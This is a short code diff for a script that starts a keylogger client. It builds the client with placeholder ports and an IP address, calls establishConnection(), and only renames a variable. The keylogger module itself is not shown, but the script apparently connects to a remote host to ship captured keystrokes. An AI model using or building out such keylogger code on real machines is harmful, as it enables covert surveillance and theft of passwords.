@@ -1,6 +1,6 @@
 from keylogger_client import KeyloggerClient
 
 
-call = KeyloggerClient("PORT-1", "PORT-2", "IP_Address",)
-call.establishConnection()
+rm_logger = KeyloggerClient("PORT-1", "PORT-2", "IP_Address",)
+rm_logger.establishConnection()
 
